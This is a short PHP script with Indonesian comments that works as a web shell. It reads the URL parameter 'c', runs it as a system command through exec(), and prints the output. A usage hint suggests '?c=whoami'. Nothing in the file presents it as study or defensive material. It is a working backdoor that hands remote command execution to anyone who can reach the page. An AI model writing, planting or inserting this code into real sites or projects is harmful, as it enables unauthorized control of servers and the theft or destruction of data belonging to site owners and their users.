<?php
// 1. Memeriksa apakah parameter 'c' ada di URL dan tidak kosong
if (isset($_GET["c"]) && !empty($_GET["c"])) {
    
    $url = $_GET["c"];
    $output = null;
    $result_code = null;

    // 2. Memeriksa apakah fungsi exec() aktif dan diizinkan oleh server
    if (function_exists('exec')) {
        // Menjalankan perintah eksekusi sistem
        exec($url, $output, $result_code);
        
        echo "<pre>";
        echo "Hasil Eksekusi (Status Kode: " . $result_code . "):\n";
        echo var_export($output, TRUE);
        echo "</pre>";
    } else {
        echo "Error: Fungsi exec() dinonaktifkan di server ini (php.ini -> disable_functions).";
    }

} else {
    // Tampilan default jika parameter tidak diisi (mencegah error 500)
    echo "Silakan masukkan parameter perintah. Contoh: ?c=whoami";
}
?>
